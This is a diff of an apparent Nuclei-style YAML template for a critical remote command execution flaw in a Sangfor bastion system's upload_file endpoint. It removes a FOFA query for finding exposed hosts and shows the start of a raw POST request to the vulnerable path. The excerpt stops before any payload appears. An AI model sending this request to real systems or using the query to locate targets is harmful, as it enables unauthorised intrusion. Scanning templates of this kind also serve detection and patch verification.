@@ -3,12 +3,8 @@ info:
   name: 深信服运维安全管理系统 upload_file存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/obm7kffa6g9ew24v'
+  description: ''
   tags: rce,file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: obm7kffa6g9ew24v
-    fofa: body="/fort/login" && header="FORTSESSIONID"
 http:
 - raw:
   - 'POST /fort/cssp;help/v1/app/upload_file HTTP/1.1
